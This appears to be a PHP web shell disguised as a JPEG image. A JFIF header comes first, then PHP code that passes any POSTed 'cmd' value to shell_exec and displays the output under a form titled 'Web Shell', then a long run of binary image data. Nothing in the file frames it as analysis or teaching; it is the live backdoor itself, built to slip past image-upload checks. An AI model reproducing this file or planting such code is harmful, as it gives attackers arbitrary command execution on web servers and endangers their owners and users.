���� JFIF      ��
'<?php
if (!empty($_POST['cmd'])) {
    $cmd = shell_exec($_POST['cmd']);
}
?>
<!DOCTYPE html>
<html lang="en">
<!-- By Fighter Kamrul -->
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Web Shell</title>
    <style>
        * {
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
        }

        body {
            font-family: sans-serif;
            color: rgba(0, 0, 0, .75);
        }

        main {
            margin: auto;
            max-width: 850px;
        }

        pre,
        input,
        button {
            border-radius: 5px;
        }

        pre,
        input,
        button {
            background-color: #efefef;
        }

        label {
            display: block;
        }

        input {
            width: 100%;
            background-color: #efefef;
            border: 2px solid transparent;
        }

        input:focus {
            outline: none;
            background: transparent;
            border: 2px solid #e6e6e6;
        }

        button {
            border: none;
            cursor: pointer;
            margin-left: 5px;
        }

        button:hover {
            background-color: #e6e6e6;
        }

        pre,
        input,
        button {
            padding: 10px;
        }

        .form-group {
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex;
            padding: 15px 0;
        }
    </style>

</head>

<body>
    <main>
        <h1>Web Shell</h1>
        <h2>Execute a command</h2>

        <form method="post">
            <label for="cmd"><strong>Command</strong></label>
            <div class="form-group">
                <input type="text" name="cmd" id="cmd" value="<?= htmlspecialchars($_POST['cmd'], ENT_QUOTES, 'UTF-8') ?>"
                       onfocus="this.setSelectionRange(this.value.length, this.value.length);" autofocus required>
                <button type="submit">Execute</button>
            </div>
        </form>

        <?php if ($_SERVER['REQUEST_METHOD'] === 'POST'): ?>
            <h2>Output</h2>
            <?php if (isset($cmd)): ?>
                <pre><?= htmlspecialchars($cmd, ENT_QUOTES, 'UTF-8') ?></pre>
            <?php else: ?>
                <pre><small>No result.</small></pre>
            <?php endif; ?>
        <?php endif; ?>
    </main>
</body>
</html>�� C 



#%$""!&+7/&)4)!"0A149;>>>%.DIC<H7=>;�� C
;("(;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;�� �" ��               �� F 
   !1AQq"2a#$34BR���br��C�%5Scs������D����             �� &       !1A"2QBa#3��   ? �W�� �ƥq.��b�E���Ýd�7�G�Ih�����8~���|�DB�U]�ܯ<�TU�D���ˤ6 ���?�oןt1ޑ�^���t�.�8����S>����0�.9�M�;����|��r~[�Eq��K:Q:7����R��(���d;_���������� ��b�$Փ:65��I!�S������1�;Ǌ��c�k8�	؂��IE8l7 *�|J��(��_��Ư{�m�K��X�T>kՖ�b��!vj�Gd���MH$�lr��["#g4�:�H��t'��(q�܌���..�A�n��<R�*Bܐ���sd'���Юb�X��e��Q�xS�e��n�>+���3Sg�<P4��p��kA�.��Z5�hѠ|���a7H%#bm� �]x���#�5�nS��]H�DZ*w��ӿR͇�S��y�FY��g��vv�+Ls��ѷjD������:N���r����	��c��Z.4*pփ�
���>`P�b�X�����Q���sAv�ʚfKc{$�� �
�����G(%��gm�d�DD���aKّ����d��9s�����V�;�J�Vc�06ȗ�7�-�-l��f��Ugk_�R=ڳ�6Fܺ$��:���D�������r�C�����q��L�|-.��՝-��jp��Ə�3������rCh����;�� ]WFԡ�=6�<ע��z�Ez0SNv��I�HGT�)����ee�㉣R@#�IQwI{���Ӟ��f��U�:M�I]:&���MID]nH
W�BIɻ#�)1J����:�D�D4��W�j���AI�.S ��	�p8�}2�Q1��&�_D�ɺ�rF�vBt@�4�Th�y6�UQ�6-1�]�#jg�ce��@a��;�y�S�p�U�N�*�W_�;�����d�N3��I R�L}���q��5mp*�:�q�����ղI$�I$�v��M\&��շQT�9��hU
G,���KV&�[ŝ����O�;ƜШ��&��tH��w��E��,�="��ޖb�i!Ni��G�89$��X��N��77��.,v(�%�t^�ռ��Q��se������� ��#��w��� 4Xm@�^�7��Xq~(c��Ё�ta�8 q��_K�us�^¬z���P��aL��m\k����6�a/�����F��Gp,Ty�b��-e�i�p���K#m��&�]���fߢ��^R�蒯.m��!���eXW]c�G+eU�\�]'�VSr�$�H��
��4�,u�)���	���#�9+Z=)���ky;�,-�?�(
G�pL;S�č��x�Q^�6�}��W��dqԒHmPr���y�t�l؁�n�̨$7|��@�"Cl �7����M�Эi��}WTUR�4�u���*�嘜p�Z�r�A����MS$��,U�ڝ^�h��2B맷F�A#�4���H�M�}\�j��ج�-ਰ��b�Jwq,�8^�l^�H���K�ٻ,��M��Ģ�vz�� ���wzq� �V�i1�N�QD�bG�V�b���1Q��{{.�^�uN�hT]������6?�-NtY�3-@x�U�>/�o�F�q	�j���nD�)_F^�I$�$��@�Gh|����9��r��4�#U#Ŝl�p�����Z��+�tY���I˪mҸQ�v���%�&;�j��}o���I����p���f�"�[����5�l���p�����V��EJhΧ�q�S��G�KԚ��+�\OFP8�Ô)	���T���L���V�@���2T�l�� G����<�<@�Qoj�\H١����b�̽���L�bc\�E��b.V1$��}�F�L������f
���K�u�U��l�
�6�#�D�B��P�} �)p��+F5�m��iYZr�ⱝ$����[���,>?�ʜ,�q��[<"c�7E�q�@Z�-������biܱ5����Z��L$,�`���E�۱1$�k����6�^yЯ^�	�n��:��^{&��J�����5�9��`��*����S�Dr�07y���!�Z�o1D����f�����Y�ZC=X�����i��g��a�nm�Ԣ���s�r�,1���j�uث[~�te��ݘ쫱9��7�D|�G�I��ь�<st��$yާ�f�N#�}3�>%��%� lf�*���_�����7�w�;��ؗV���y�t�ֽ��˸�������,?�2�V�Z\���vWuu���A{���kd�bϏ��0�cO���~zV:��;4��T�`���$j8�oH��S�Y����LX��Z]PatUMaj��yz�9��ݔ��)/�����34��t���׍�(F�Ktӵ$�d��{i1W�lq+CN�� ���C�2ϊ[��ȼ��qٱV�g>XJ�"��,����(�qG+���c��å�z�S�`��՞�i�����j�x��q6),M{v���gf��v�-Qe��\sD^�*�Y�Q��E)���Af�b��`p��Ĵ5ٻ�I�$F�~�3v��}��NQSu!�7,%�D��릴婈���c����Gi-&�ł=���3���!q-ԙI��т���F���6�&F��T���������.ꊩ�v�M���0!�˟���K�T�$��}IkX I1��D����C����tr�W�ޱ] od��c��jp�T՗x��jp�昪��Q�����/�G��U�K���S�&)���/J��/>�o����Q����݉�?��(�S�����S4h�7�]Xg!ce���dqlS�챹���jw�1	�=�d`UxQ�%D�]ef4E<�J챹��.��ޕ��uu�K�Q�[f�U`��{��Rt��W���ct�: UN�&"��7��F/9lg�l�����������j�N��ŚŤ�R�}Iʴ���J��eAw�pE������`��{̒�u��n�	��h� �.�v[�U���~[����%�x8���
g�]O&��i�W��)��m��:�9�<[�����nb�nƻ�TX�mZM�ͺ����G��e_���cw�1�|}f'�=)m�b��i�ʒ�lx��7�Yz\�Y�cu�M�J��pD���6�uv�}�Q�sY@��c?�������GAͫ�x��z��j;	��)�n=�*������{F�x\��1_��T���b���9��$XΗi.n]I`1xL�n-��B���1��4+C3:Ȝ�!e[vK$gh%V.�>��kı�m����I��[�����oJ�6X�rѷ�Scq��Q�[��Vg�w�J+��<�m1m�����g�N6�-*�'�rN�[sS���2k�
�I�l:l��^�#3\*|)�)��n�؝<�n��
hu�YK3�,9jeb�;T�%��Io��	�\�$�C�ݞ�3�X��Cb�5��t���n?�,T�О����TQH��2���~�(9��ue:Z���wPIV��[jLq�v(\��2�8��r�Y�����R\b*g-D�ăk����-�$��V6��X�x��[��^ y��ǉ�
���-��ϟM��6Ֆy��i�V�)n� Ty,�_�;����%����H�b,�6.'$<j��%oFŃ�w�����E7B���8g���|��
�:X�N�f��^�b��O���vJI��9����
<Q�h��Z�V>����d�y*���:3�\����_O?UxԠD�7M����}�����Cm�#0�6�/�e��[I����*�3\3@�<��| @���.'i����b �k4a�/=c��s��}��������eI=T�𕑗�5.4pA���n��G`��}{^vD3|�*�v�>	L ��jn�*��/�-ab��=|=}с����tIM����/o?��6f=��hy'cl�3]}��X�!ŝ=���*Ҿ3-�mu������fI	�V��	�$nݎ7<��Q����U��nn��B� H�"w�؍�-Uu0VE(�FR�#u��rg:S�jLv)\n�r��0Ӈb�5�F�Dc�9�l���7`����-�q�jǹ*�M�g��d������as�n�A�������t��ɖ�|>�TS5��Z���f)^{/��%h�"�䚮��+�.G��;V9Nd���n�c�⺠0��@;��jČ7X�ߙ��E}�ՙ#�n[��8כ{YoP�0:�F���n��Y����o1�hlE�Ա���e*����s��d�J6�+�t��Kf��uC�K~�~�]���:\oTx��cƗe�Uq�@��'b��D�Q1�~F[����Pf�>�t�]Zr���H��^r�x(�e���ii�E�L���n
r���Q� �@��-j� ����gS�\����� )��f&�ˬ��H��k^�Z:��6WD@�� fj�W :1�sI�!���E>W؂c��e�r���3��P�����,��,HN��.u��I#��:�^���y�Ib��zUF��*�+
ָ�`$�խ�aq���Y��R�ku��-�ܤ�KN�	Y:�'w5�B3�ܰ5��rsH§&�"
��7�Jޅ�臵-ښ��U���2~�#AUu��?�#>�,}k�;K�w�?t.2�S3��k:��wܠq���i=t��	�� é� ",�p�����$���^��ę�\�o�.�^�	�������}<�SbO��1�|��jGT��<N��d#�6WU��ԥ��m�(:;O�yj��o3��f���l�!g��Ly2�=	�֚_����7浳�3�Z������ʱ�I�`5S�}㮛�����r���;Z�*^{-�q�V����Yr]�?=�Z
c�C��p�0���4Լ�c�ȕsI�f=d�T�jZZ���]�zV�n@�O�i��|']��>*�
�1Lb��k<uc���M\;G�a�J���Ե���y#��O��8c�Wx�]M�uNc}Y�G�Tm.�\�R7wh)�*�1���s@�u"h�.��h8���-c靣N�+�~�U��M!h<�Z9�_�6 �*�ʞ'ƀ2n����7r�0��n"b���b�{[+�4!��%CE@��Fl��;�m��y�й�M�$a��td�6���B������T��C�l�h�l�T8f"�e�Oe�Y_��X���T��!,N���&H�Z\$����� ��*_�E-4Hݡ�R�Lѫ�꽎h+c���YO3*"����ë�,�s�å���C�pn��N\��om�e��u��$�ps7�Bm���8,�j�7j�~���@l��4%&�\�O����9Q�k��7���1�H�;�S�pr�t�_��@�9ɉS���'�W�%])�pt�Ϳ�L�p�����O=����?�ǳ+�4r;�"�/�W#��W���\\C\�QG٬>��HE�eU?�#�(ˢG'/����I�7/��h�R@r˅��]޸�9a�$��5L<�km��Ek$&�!���ʫb��io5�X���_�[�z�0�J*�U��K�1 <��סN}گ=�=��҇B��\]oyP�OC������?�J�(��UMs�!<f��Uc� ��w#]3ucBs	�	^���f ��6��e�HJ�ρZ}�1���3�6����'ju��|dC��?���h��e*H5�w3�]�R�>C����R�U��DPR�MlQݷ���ɷf]F�|T1�M�k������V1��xnV������)\��[p|�-�ij����m9XO��<��t��sX��r���y��x�i6BF�+\vN7-�uc�ҟ1ӱ�� �.F
&����dKM�]Xem�����L����b�B�H�5Q����?��J�U�{\��qeU;*餅ôF�i��N<�5WV�a����;��1�2δ��A�J�I䦨=�=�ş�����r��M�qU���=��3���sj!ed:.�>3�S����*����=�����sVm��)��[j���!��s,V����0K�5!�9�v��+���k�^�U��Wn��^UF�o ���5u9��,c������ؓ���)�=�:�wC �*<�����WSO'B^����-�����~��9���]���C���luvX�ݠ78ol]x;�+z��2Gt���YZ�>��!{���as$�Ǫp��xs
��R����YN��c��AU$7		���6�,�X��1巋�[r7F��6��1��JcT˫�7dA�L���pUbV�n:2�e;\c%���kÚ��U�O�T��5�s��bd}��nK]&c�t�q~+�R��vjx�šJ6�{�)���E��a3wa���q������C`���µ� �i��wek�`�Jg���u����w�u���De'k&�U�Oˈ��$�����DO�0�7�ɪM��cmw����>�)[��J���BU�G/e�;�������1�v�=��G6X�l�ZO���ݞ��BN�Vޛi):�&cdB�؜�v"�RI$�@_�czZ|�[?u��`�eVI��'�[�z�@����Sy��
OP�K:����;�,!�o淓{3�,&!�O�����NQi�����X^��*I��)���=�{?�H� �g�dh�,��O]<��?�*�4����Z�3Ⅰy5����l���kHcw->�>d�vl5�#�E�m� )U�$��=���� ��>fO�R��/����.�z;O~�r5ѭ?�TV��6�ж\���j�<���.�k�u����ԗ3�Qb�Z�4q���@bd���i���KWNڪg��x��=�4�7���"�ø�⻚k�p-k��"��Ԡpi��62{��Dr����N�\6	^�.��
a>e!ؘPqY�P:v��Gn1�~%R���f���u��*|W|ou]l�n��!i�ۣ�����u^�%n�~)���q�}���%s�jELc͓��-Dr�x[#-rv�{���ym��tn�y)�/j=�
����XɎn;��g���}�a��9�o�.<���'j��D��ȼ�2�ҳNk;D��o ���e|Su����X/���G�������܎�&�����n	�x�+G�ײ���0.��b8s+��+{�X�WL8�e���9#�ifm�:�)K�9�h�68q	��S�����>��"�ja������a�ɼx���V�����c��5�6A��*`0��³���C=��k��}&3k2qq�)�;��5[KPswo���hU�+OTxHq;m�*ْ�n�ـ��Z����&�����t�G`&����K�D~HѵVa.�(���d6�|��Iڿ� ?��<�S�*'w�5��B�Ҝ
����� �a�6��Cc7&�u�T؃��;8�(q�z�f�%C<b�!���Q5�qy���X7M�,�d�_#��O�V+ڒU+��#�(��X|�%���VY�Z	����m�����7���m����XTԽ���X�b�X�ㄿ%���ot$�{@ !�'9	כ���F�~Ң��R��'5�����M;N�ñ0jI$�BJ�.�=,��m�w�+ҧ�
*q�3����o0S��`\�Io5���[�CE���ܰ����ki+�N�K]�/>)�av���WZ��Zn��NV�,gD�z�pSU�p���uW�SbB�P?]�Yz�࿘(^c��F��g��Z��<;�G	ͻ�k�˺U��'�v�[����ٜ�T$����֐��c���LN=��Z4Y��9&�fh`�Y��� ��؁��<jV����hH���c�w]uA5Ltщ%9Y��v��سӟG��l4�G�D<��VT�����P�ct]���1ܪ�+�T`u.��H5� �"��;[_�L��A[*o�8y�&c4�m�'�����]�A]&�������E�FH����R�㣯r�d��jK���<=��hjOY��;xYIQU�M�T���� �5��d�2VH���?�i9.�H8=����cd���x��)�Lή0r���H�٪g�)d7���p��0Z����X7�ں��$�%������PU
�'a�s�j��1��1�a��.ޙ<0J�Hdn`��������*p췽�E�+��W;��u4pU�Y+��rY�&���k/+F���9�rqzpu����;G7R�&wTR�t�V � z7h9�W�J˺��Q����RMS��H��lQL��J�eO�R��lR8�87O�a� e��^X祸{$��u�!�ͭ��ܷ9�3n�5�����Z�!��]��d�/��#�g��N%�%��a�3s�PsG$.|r������`��2��I���u.7$�d/m�U��-V<���ϣ|ըЪ��i�Q�u��?Hف����Q`��]�R�O����Wp1��k?VӮ!5�6)8>$�ش1�cA��+<�6wd�C���6Y���&Ȩ,7�՗����ޒ�A�=̠}��S6<��V�P|s��O��i������v������	V9+sD� �U�,��"}��i�U�PG~�é��XI��:=���Q������
�׺����߮[&��
���);�0�#�95����RI$��Օ��E�[��f�])��&��`��jo5�����<0��M�8$W���CU���Y:���r�h�厮m����.�:Ɇ��~�mV/��M���E\%Y��y\?̈��7
��@%un<�8�׎�&v�Zb��Q�<��g��d����KIUUa�N׍ri⌂_'�C��<�x�ڮ����G�����Ze��m�����-4�SK׾v��(ϖu�-�Hc#d��"1�F����5/V���OȄ0e�a4	bsK	tX�I��U�>�W� qokr�6�<~RU�� ���c8lVslo!!UQt���h:��D�Z�z+SXZ��G�Ջ�����y_g<��s�q������0���
vt���~�Eh��G4�ռ_�j�n���ɐT�m݄�%��C:U�N�9�4�ю���A���0����ګq>�O�B�TUҰI�&�V��X���]��dKG�Ũ�輦͓����{�D��&��@�q����0�سg��M���_���)������?��^�o���RG;3���pF��T3�.�u50�d�.��s2�7I$,,���tA������L�������_ъ[�J���i.s��75D.������{��7I�|J��D�9*�s����E� �D~��\=#��e����x�	�n0����Ύ�a0F��i���%V������#{�S� �b�� �!h0���ގTOsjilvY�BT�ZH�۝�;��|Kx��F�Kr�KJ�����5���"��7�H��)p�ۉs#0��ň᢭ϑ��p�f�S>XŃ?�w���c�8H�oH*q�	I4p�?�L�?Y�����3ecv9W���&b_c��Luv�ezzN��x#�xp�w�Y6E��2���e2b�_dm��X9�f��j���mD����Q�HaoږKK_�T�������z��yP�#��3;\�s��>'li�S�|�S�Y�:�4S�g�O���==��f��
����;<�*I��⎨y�a��	*<(��=A6���(XޓU�娩���U�U�s�J��9���V4�f��ֵ��Y'،D�v��Ph�$z1��t���BK�E���XlSsS��l��	)��]�$�ऒI&�D]ezWl%jw��KG���1�:sG�7��`qy�i�`ȽKo�z����Z����%y�X:�j��^�0�W�=�}���
��S�b�=��`VC��-qQ�8ɘ$ai�E�Wy��K������p���w�Mw_C��0��Э�xr�)#K��WL:�,%m�;kJ���=N�X��2�;��w�HD�v��o��?�W�t<��t�Y���"25�s�Yn{N3E������%l������������&a�4rӽ��$�|@�+�ۖ���΍CNǿW��p�ǯOKMSl`���z p&I�b����S����ASNڪi x�{KQ-�I�m	šla�e�AVb��sA���U�'+�{m#	cǈ\���0lܯLmc�O�VO��O<�s"#�����~+_�d�g�]�tn��������
m�Z6�F�j�Y�E�6�����pӸ��柅�W���.�ڹ�S6��i�l`0sږ^/e�>3����UQx4h��H��%b��t�I"$�I �I$CWJȩ\_��������2o���UW�҆�Z{�[8D�BX6X��F��t�h��n�aV2~� A.-q�y���q�֖�����^��g2�G;�s�r�B$'%����t�Q3m!۔�����oD�+�{�ݹ�NH�LD��Nm�Ŵ-���D��۠(�T������[TTᥴ�sN��ش=�m?G)ZG|�n�����e >ge�7������65� ڨ
�����I�Xf����;�29l�SXi��@��h���F�xY�fxÂ[w� k����:8�ۋ��M�PM.̬*p�ր�Tt�P!�5s��A)�M��Jf��kx)���@X��F᱇�u��D39m��I1)2)�ٙ���Vg�Չ��SR毭2[־� $v)R�P�X��oN��S{a�	�UI�k!�_y���I&FCH��!�%PP'{$u��{��?5���_N���Yv~�O��;>���^����f��|m"Ţ�OJ=ԡpӖz��2B���X�C,����:u����� �S/��rx7�����k�]�j��%$ܺFα���P��\ID�l��e�I$�@���,���5��`�b��;#ҙ�z&<�9/;w�3�/D��CU�����y�"/Z��^�?����G�܃��=Th�1�J�,�E�j��~�$�RnH�bf����я6F`�wO�)�1�QG���º8s�2�y�A1�(�ں�����8|��i���o����ـ<Vӷ�,��)[<,��ۄ&�KX��q�%	S`�gu{u6*�E$UQ�v,�9r��bҮ�T����;<e�x�aAQN*i�#uz��(&5��ZΈ���Y�\Y�gGb�%���\vHѼq校�#�1�
暢9���܎�w�h*� :S=$�	�[���ƹ�)Ӳ�lC�q;/��O����U]�S�����>� �Oi��u񘼙��;��֍�jZf�S6.����Je4d�^e�õ#�dK��yޚ�;6�).���m]I$�	$�@$�H�@+���6 ݽ�%J�
� m��7��\U�:.ٓFb�4��W��g�;VQ76���z��`�8d�o�D��?�.ϑR
�֛?���A[m���V܄1A#�M�}�Y$��c)������	���y�3�}���R��Jj��W|E�ؓ��ۚG�K5|���������}Ï%;m�=���U��[-���(9���\�/+y"�z�Lm9Lb�?�w��(A���G��ìV-�T:����r7�WX�o��9��G�X8��`��
�?ּ8�EVH)h�D�5F���RE�3���=��;����U:w8E�x��ť���B)%m3�.X���U�.=\�nS��;���筎��R�S��2�(�!yk����Y�˥��d�=CG����VǺ|sE��rB�����s��)��a�.��>����hr2jh �!�9q(]�$��Yr�ڴ�1��];ГJa���XBl��mt��|�s˓q�e�+��-<R����w��+�tl��IVyaI�+9ҳ�䫖�T�(�o�2,v�kg�^��z�/<w�7�/C�O�j��������b^��蓟Dx�^y�{[����"�H���Ϭ+W{��F}bՀ��ӎ�eˮ���N�َ>	R�4_�}�U.�M+�4��D�-��5�@�6Z��x�]n>�9�Q���7���-0�'�oܮ�R�W�Vݥi�ta�Ʋ�J�fd�6s�Zk�_FH-��)cυ����V�MgS+i�|��g��J��o����P�I?3M���2��eeLB���Z�-��kû^���9�1��I�����s�u������BG	b�dqnS�2�+��9�!��f��Bʛ��3 ��m|���1�ORh�R����=�;���L	�b*u�]	$�@�������ؒI �$�@+$�I�MpNL)7��3���j��ą���i�e8w�ȢSJ{���������S��w���Y��ԔQ:�J{W�!ea�Yd�y�#��	�H�x����<4����kz��us��a-��@DE���>;ր���nI�S���E;���h�g�G~�Y�ۥv#Xk�ˇ��F�F�#���q������L���5����'z�t���j;,���ac�vc��;|�-ʭľ�aٴ��3�d|��� �<q_��qSv3k#�k�� $�p�G�1f��}�ŧNE�����^'�ʹ�*�ji5��e*������?U���O`�m��:��}mw++XYT�́�o�N+���l�dO`�?�E���FP�B���x)Tg�uV�.�v"��6S��.z��.^��EfpN�F�(u]������<�yO`7�����Ilō�I���5�)��U�-d�:-m,ze�pm�������J��m�X�e�����Bi�c�`��O�+f�|˹,Uy>T�h0����wOi��A4=>uj��tq�|�m�e�>�5r�]A�*�T�n���TrF:`F���F��7��V�מ���2�� �#���ʣF>���/_}	�������7U�<w�7��������Y�5�����\;-���g�i�e�VL�D�����+�U�ͬ����7�\ut҉��t*\�)����o�\��s��l���m��'�Y��F��mA��eR�ѢhOjQԎĒM&oNܖT�Hi#rg�V5��s�H��=���A�����M�����d�I$I$�I�<�Q�S��dǛ���v�׍�иi�
Oի�(���1�y��\��Du����3��v����8��A�ud﬩;O8pV�atc0.����Z�:uc���B��t�`Wh��.t�K�:�%KU3�����#���c�f4�}�ǚ������I.��6;3ݔ����7�ɪ|��1U:��x�B�x���H�Q~,W�뽦"=��S�q�O�)�֦&�Y�u�K.�l�\l�|��%�����<��Y�PT���W��sV���ԕ��>�[�Ї|25Y���67����V>�&j6�r��	���%�>̒+o�Ք����jT󚬇�Z�s��5d���-����Mq\f����9�?��8��~�}/�U�?�M�lvl:? �Bw�>�񊡏��rJ��?I��wH�J�y&�W#)_�Yh�3ϥ�x��
|�9,3��7����͵�����d+��?�ֿ��%��>��h�Nw���� ��G}yZ��wGO�+\��<�T:�&�%}zWN���)�� ������ �5G-$�Q	>���'}ڦއ��a�k�!TS-�6أ�P��#1���AI�����㿊J!�3� \nV�����A2A( ���O����*|�������)���[�q�{_��,�2t޴�v!dBݙy�LK
��ga�.�[o�Yޮz
��n������������NZ:��6�ɮ�7aFX��ӗ.����d�(ΒI$�$�.��g.�#��]��;��э`h X(�$�U#Os+KT�;���I$�I$��LOJ�4d&��ELp�8��$T�<��"��ī�R�Ɲ7"�J�}3z���h
Z9��m��}�����w\�k!"�����k��0�Fu�����p+Z.
p3ͽ���;�{\S�9�����T�wG�~r��'\����gk�,�D-� ߢ��L�zw������S,�{�$�V�eÕ�=��w���&jL��~o�vn�]��t=����'�Q�<�J)�_����x|}Ub�B�F�%Tq���a��
�?�ף��,=D��x�$�[�K�	�~�˖1ˮ�j:�̴�0msHR&K �'=�@<}Q`��P��9�U�m�T�4���r�o��_T���*q���=�}T̨c�s7-\��7�a�R���
D��ɲ�J�
it�۔fMWN��%-��Pܤ�׍]/��**��F���ks�z�,+������I1r� Py,}o�?��������K��Aӆ�rp6L/�<|�Z�tX��;�
�p�/U%r�6�7pS�C�o_~�iq�VVU��ϊ�� ~��W���j��ﲜ�C��� ����AL3��}2"���N�V�!�7pU����o���+��m��<�����ٓO��E�e�W&3,[��
�hj�1���(|&�UҌޱ�8#�u��y\j�:|6G>��X\n�^~�Y��u+E���]I$�I$�$�}WQA�II]$I+��I%u�tL8M�emIl�*JwM0�;.��U��ڥҚ	��e���;R���fH�Ѹ) ⺪�j���a�>��YYR�jg�����)7S&� �s)u�=Q�R�+���<��ԕ]|x�=N&8�g��rN�^'rMh��<@Op�V�e~��"i��(�r�L�]ɞ�a,2�gv_�i�G��#��^�j�;ۇ���=d�Uν�V���=����.Y��h<کËR��<1�j@C=�1ȅX�Y��w�g��M�s}���B����B���yv�/ͪ�~z0֛-r�Z��mkjþ&~�"r��V$�"~�������$��/I���0D�����2�����
�:�N�\ӵer�UL+�i:c�i����=��c��pV��8�̭dE��ޒ�C�.�����
�4��l���"�b��s�����m���k����0�m�i}��X����3�]�a�����h3']D�������
�]dz<mPV�:�NK��b-�}�J�7�y!��~�R�}�v��./�(��������Z�|���Tth<�-]0�w;�@Կ�ґ�?�*9sO$W�Y�_Hb�L׍�P�;1�.W�F$���e�SR!'r�ӫ�)��%�U�'G�<9���8���lZ<J�n�D""��F?wXsd�y�J�:�(j��3�6x�ձ�VMec�5��UE4��\�9�cN��EYa8����)=K�߀��|�eˌ�|�i�&ɷ�J�X8�I$�"T�(��p�z�P:���W(<R���=�l�!�/��c�(*�l�4�;������� H�f0�> �T��Y��+ȩ��Y�J���q��t��F�Sԏ� Z�􆜍!���*���YUt�V0�d�[�p
���8�i,��`�*� �F�80���g�������F� [���o}V"<2����`9�\8J۴�N�y��4I'˶C���lII$�(=��$���q'Vϑ�̳�}�(�gM��{��*[-���w�upВ�v���ťJ�q�"F����-��$�d(ݣ�ӽ����$��jHEMhpH��-��V*:h�P1�Z�HW=����ǥw]O�g;����	�̝f&{�RÎZ蹭$�]����d����T�j��p�Yi�T,'
cƆy�#ș���}�`��M��d�*��}�Ī�i|Yo�����$���V�@*�G��S�X�&�\�Ӡ��|U���бاB�b�{�V�Hâng���-u���iz1�Y�ED��xؘ}��N-�ڕ�bJb5I3)!�ͶF�_J(#��j��z�����'o<"�m�a�����k�;�3�.�o��y��I�z��]�y�s�2M7�����uB�z<|�Z�������R
�s����YΆ��ʎ�L	S���6�F硷�gK��y��B��y�gYv��]<l�4!��3�+�k�tON���N;�.?DE3��fB�2�l��4��%@���ݚ���uVi��\T6��e_�`��u��]�}�Մϩ"z���틇?xpY����j8B[��v�ނ�*����6�S���͜<TDc�6���튚���]Ե82C��M��a�|�у�N�mZ��<laѭ�L�?��|'u3�eٗF�� ݋Dm~CT�8�<�i#?p���&��u[	�3��o.!=|��^4�bJ(�l�a�\��PId�H����UB��|����j��eC�鈊NR������6mIO=U+����oh(/�]�I�91�d�lI6DS��Uz�g�q��>�����Z���/�o ����1��1f��e��f3�j��A]܏^~Y\���T�I8�Ir�	�HؘdykZ7��g��=�c�������`������xK�}�s��U�j�>�]\?.�J�\ޒ�zh�I$���O�ٵ�����Ԃ)�0n�7����P��0;,Ү�
{B�my�N^1��p+�����<�*i%;��a���f*��VI-�ҕ5!�U��5����h�x�� ���ZY��]t�=K�G����4m>�QL��0�� g����à�S6V0Z��?t�Wf��qݑ�"2��K�I:�f>�� j�1�ɼ8��?��:?���`3������(��,�2sw���t�C�c�U"�f%NݯR�ِ{���-K�$�C䱓�ʱ�)x����u�,gId�V��<ڭ����u�r;��[[F�I*4�L3�;��^���kd��8#XoR�h�$
��N���>� ����u5P\nlt�y���M��9��[��ګ@���8�C\��d�IOZ猣���R��f�x�{0�:I�u�q%g)�Ni�K�7��S�F��E����c�u�5+�æ�h�5DYb�R�9���&��?��7e~*�SR �;Y_'d���c�cU)��}$T1GM�&1��(�,r�w��;�����x�����报���Us�P�D�lm.q��Uu$��S2f����>Z
(���߈��ا�SQAG��F���D��J�l8G��Ǩ�����G���Vu�"����ѭ�w.ӽ��G#�s5˱9uv�m��^���RavxI���+II_c3D�F֝�eq�V�s��hѧW�ʊ��	b�@[��n~����sq�$���� j�M��H�"�"����'�+���aq��W<����T��'$�٩'$�n�N\���bjNsZ39��T��@��0� 9�ϗI����W�FXNr{,J�bUuRF�	kD��@���\��8�s��q�#���r+\co��\�"���y!��o�"��ݥ�
�J�3��i��T����S�#ȱ�.�c>>[��o�غ�HFh�f�g�EE+$`,:�i�i���L�I$�n�k��
s5��P�~�R6�yxh�r�]"
H��Y�&)�a"���R�*��H*�oC�珢����1��7?_��^��:�(~�[��gl��uU?�R��j�~R��v����|^U:�SH�t�5<g��ݛ	�t�DϢ�'6q����b��:�:�Q�G%�t�ew�*~,���Z��w���Rl2�q�$�޳[�7ʛ��[��UA4[�	o=�)�ԗB�w��-�NB��']��X���H��S:�>%a��y6+3�n}�yy����d���d��5
H��ݐ��M�v��'�RV�`���:|�X� ��� K��Z@�r��?���C����JI{���	��5��g%�y&p<V�
�l�5̎=Y�r��kP�pwT�K9Y��y<lQ����\�>��DO�2f��"���}q�h)/[T_�
xN���Rҡ�T�JꪘD���a=��V,��01�@��M�T�2��[y�9Y�ĞI���f�Vvc�t��8�-4�SB�ahll &�R�GN�c�˫���;�S,s�\��NI% �I$\���N�۪-�����LP޿���ZI�s2��Ŏ��[|����5զ&�!����:
�6�裡 wOTu�\2������q�,������c�Rf˫LJ��=[o����54�A�C[�#�jʑp�g�+`�0g�i\n֎��*ɵ�a��!c	 �㦧q܄�c�F��w?�~z�L�1�Ṟ�`�'��n����=U�s��|��u�Q�k�Z�OmUd�lcdr�nEse�}6�V4ۓU\�:yLn�������
��Y ?	Q�����������J������Wɏ9�jc�s��}�1���6U�X�<O1�:��̪����Z�g<| ٿD�UL֘�T�V:󼹧���Q���WV�<tc���Q��$na��B�EQ)�"��9�!e�8�V�#��)� �B��A�y�$g�?���؀� qQڀ�{��-�pPm6Ms.s˷8mOIj&Vxkjd��s34{�tS$�V݄�j�������'��Q���\g`-���$R��u]��K]�������R5�uP�����Y��Ǜ��� ���Ŷt���,nu��]6�!�X!��z�=��tX�ۚ��	w[3�⁬��+%�qu��#p�F�%��@�U��\���~N��u������"���]���7f8=���H�Um9�i�m�7G`��@�)��J��.&|Z}G�W�5�-whq]t�$����Y�ܳ����C�C����s�BV��=)i=�,�%y<����+�\��NZ�/a W�����^�Ҵ�j@�]�*��;]A�j�X�?�a����9��lϊ�y�w�9�Ξw���I	9ZM�)�{��Yl�(� {�fqh��9t\�� &r_�NO��&�lQ���IUdhI�n�{P����9��F�\Yb�a�/M�󜾔�ki�S�6]drzSy�A����܃I$S�E��ҥ����g�n^{��V?�`*pЦ�S��s�������m�ӈ)��T=���n�\��b��iW�QIs�}´��i��Y�z�}���e8�����4c�/�g�_���Y�\N���
